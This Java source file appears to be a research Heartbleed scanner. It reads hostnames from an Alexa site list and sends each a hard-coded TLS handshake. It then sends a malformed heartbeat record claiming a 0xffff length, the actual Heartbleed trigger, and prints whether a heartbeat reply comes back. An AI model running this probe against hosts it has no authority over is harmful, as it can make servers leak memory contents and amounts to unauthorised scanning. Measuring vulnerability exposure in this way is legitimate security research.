package edu.uci.nds;
import java.io.DataInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;

import com.opencsv.CSVReader;

public class HeartbleedDetector {
	/*
	 * Type: uint8 - values listed below
	Version: uint16
	Length: uint16
	Type	Version	Length
 	T	 VH	 VL	 LH	 LL
	 */
	
	private static class Record {
		int type, version, length;
		byte[] payload = null;
		public Record(int type, int ver, int len) 
		{
			this.type = type;
			this.version = ver;
			this.length = len;
		}
	};
	private static String sslHandShake = "16030200dc010000d8030253435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101";
	private static String heartbeat = "180302000301ffff";
	
	public static void main(String[] args) throws DecoderException 
	{
		CSVReader reader = null;
		try 
		{
			reader = new CSVReader(new FileReader("alexa.csv"));
		}
		catch (FileNotFoundException e) 
		{
			e.printStackTrace();
		}
		String [] nextLine;
	    try 
	    {
			while ((nextLine = reader.readNext()) != null) 
			{
				System.out.println("Detecting "+nextLine[1]);
				heartbleedClient(nextLine[1] ,443);
			}
		}
	    catch (IOException e) 
	    {
			e.printStackTrace();
		}
	}
	
	public static void heartbleedClient(String server, int port) throws DecoderException 
	{
		try 
		{
			Socket s = new Socket(server, port);
			InputStream in = s.getInputStream();
			DataInputStream din = new DataInputStream(in);
			OutputStream out = s.getOutputStream();
			Hex h = new Hex();
			byte[] b = hexStringToByteArrayConvertor(h, sslHandShake);
			out.write(b);
			while (true) 
			{
				Record pkt = sslReadRecord(din);
				if (pkt.type == 22 && pkt.payload[0] == 0xE)
					break;
			};
			while (true) 
			{
				byte[] b1 = hexStringToByteArrayConvertor(h, heartbeat);
				out.write(b1);
				Record pkt = null;
				pkt = sslReadRecord(din);
				if(pkt.type == 24)
					System.out.println("Vulnerable");
				else
					System.out.println("Not Vulnerable");
				return;
			}
		} 
		catch (IOException e) 
		{
			e.printStackTrace();
		}
	}
	
	private static Record sslReadRecord(DataInputStream dataInput) throws IOException 
	{
		Record record = sslReadHeader(dataInput);
		byte[] payload = new byte[record.length];
		dataInput.read(payload);
		record.payload = payload;
		return record;
	}


	private static byte[] hexStringToByteArrayConvertor(Hex h, String s) throws DecoderException
	{
		return Hex.decodeHex(s.toCharArray());
	}
	private static Record sslReadHeader(DataInputStream din) throws IOException 
	{
		byte header[] = new byte[5];
		din.read(header);
		ByteBuffer b = ByteBuffer.wrap(header);
		int type = b.get();
		int ver = b.getShort();
		int len = b.getShort();
		return new Record(type, ver, len);
	}
}